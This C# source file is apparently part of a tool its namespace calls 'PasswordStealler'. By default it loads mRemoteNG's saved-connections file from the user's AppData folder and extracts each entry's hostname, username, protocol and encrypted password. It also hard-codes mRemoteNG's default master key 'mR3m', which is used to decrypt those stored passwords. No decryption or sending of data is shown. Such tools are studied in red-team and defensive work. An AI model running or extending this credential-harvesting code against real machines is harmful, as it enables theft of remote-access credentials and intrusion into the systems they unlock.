using Org.BouncyCastle.Asn1.Cms;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;
using System.Xml;
using static System.Net.Mime.MediaTypeNames;

namespace PasswordStealler.ConfParser
{
    public class Connection
    {
        public string connectionName {get; set;}

        public string password { get; set; }

        public string username { get; set; }

        public string hostname { get; set; }

        public string proto { get; set; }

        public string defaultPass = "mR3m";
    }

    public class ConfigParser
    {
        public static List<Connection> ConfigParse(string pathToXml) {
            XmlDocument xDoc = new XmlDocument();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if(pathToXml.Length == 0 || pathToXml == null)
            {
                pathToXml = Path.Combine(appDataPath, "mRemoteNG", "confCons.xml");
            }
            
            xDoc.Load(pathToXml);

            XmlElement? xRoot = xDoc.DocumentElement;
            List<Connection> connections = new List<Connection>();
            if (xRoot != null)
            {
                foreach (XmlElement xnode in xRoot)
                {
                    XmlNode? attribs = xnode.Attributes.GetNamedItem("Password");
                    XmlAttributeCollection attributes = xnode.Attributes;
                    Connection connection = new Connection();

                    foreach (XmlAttribute attr in attributes)
                    {
                        
                        if (attr.Name == "Password")
                        {

                            connection.password = attr.Value;
                        }
                    
                        if(attr.Name == "Name")
                        {
                            connection.connectionName = attr.Value;
                        }
                        if (attr.Name == "Hostname")
                        {
                            connection.hostname = attr.Value;
                        }
                        if (attr.Name == "Username")
                        {
                            connection.username = attr.Value;
                        }
                        if (attr.Name == "Protocol")
                        {
                            connection.proto = attr.Value;
                        }
                        
                    }
                    connections.Add(connection);


                }
            }
            return connections;
            //int le = 
            //Console.WriteLine(connections.Count);
            //foreach(Connection c in connections)
            //{
            //    Console.WriteLine(c.password);
            //}
        }
        
    }


}
